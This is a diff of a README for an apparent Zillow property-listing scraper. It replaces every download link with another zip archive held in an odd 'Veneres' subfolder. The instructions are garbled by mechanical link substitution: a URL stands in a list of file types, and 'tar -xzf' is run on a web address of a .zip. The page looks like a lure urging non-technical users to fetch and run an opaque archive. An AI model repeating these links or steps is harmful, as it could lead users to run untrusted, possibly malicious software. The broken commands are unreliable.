@@ -1,20 +1,20 @@
 # 🏡 zillow-zip-code-search-scraper - Fast Property Extraction Tool
 
 ## 🔗 Download Now
-[![Download Now](https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip%20Now%20-%20zillow--zip--code--search--scraper-brightgreen)](https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip)
+[![Download Now](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip%20Now%20-%20zillow--zip--code--search--scraper-brightgreen)](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the Zillow ZIP Code Search Scraper. This tool helps you gather property listings quickly and efficiently from Zillow. No programming skills needed—just follow these easy steps to get started.
 
 ## 📥 Download & Install
-To download the latest version of the software, please visit this page: [Download from Releases](https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip). 
+To download the latest version of the software, please visit this page: [Download from Releases](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip). 
 
 1. **Go to the Releases page.**
 2. Locate the latest release.
 3. Choose the appropriate file for your operating system. Common options will include:
    - .exe files for Windows
    - .dmg files for macOS
-   - https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip or .zip files for Linux
+   - https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip or .zip files for Linux
 
 Once you find the right file, click to download it. 
 
@@ -38,10 +38,10 @@ For smooth operation of the Zillow ZIP Code Search Scraper, your computer should
 3. Launch the application from your Applications folder.
 
 ### Linux
-1. Download the `https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip` or `.zip` file from the Releases page.
+1. Download the `https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip` or `.zip` file from the Releases page.
 2. Extract the file using the following command in your terminal:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip
+   tar -xzf https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip
    ```
 3. Navigate to the extracted folder in the terminal and run the software with:
    ```bash
@@ -80,4 +80,4 @@ A: You can export your data in several formats, including CSV and JSON, which ma
 - Custom Filters: Tailor your search to fit your exact needs.
 - Data Export: Save your results in popular formats for easy access.
 
-Remember to visit the [Download from Releases](https://raw.githubusercontent.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/main/Veneres/zillow-zip-code-search-scraper-v3.9.zip) page to get started! Happy searching!
+Remember to visit the [Download from Releases](https://github.com/hhhhhhhhhhhhhh676766/zillow-zip-code-search-scraper/raw/refs/heads/main/Veneres/zip-code-search-zillow-scraper-2.8.zip) page to get started! Happy searching!
